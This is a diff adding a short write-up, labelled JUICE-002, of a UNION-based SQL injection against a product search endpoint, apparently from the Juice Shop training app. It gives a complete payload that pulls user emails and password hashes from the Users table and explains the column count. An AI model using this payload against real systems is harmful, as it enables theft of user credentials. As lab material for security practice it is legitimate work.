@@ -1,0 +1,9 @@
+JUICE-002 - UNION based SQL injection in search
+Endpoint: GET /rest/products/search?q=
+
+Payload (q value):
+
+qwert')) UNION SELECT id, email, password, '4','5','6','7','8','9' FROM Users--
+
+Products has 9 columns so the UNION needs 9. email comes back as the product
+name and the password hash as the description. Dumps all user credentials.
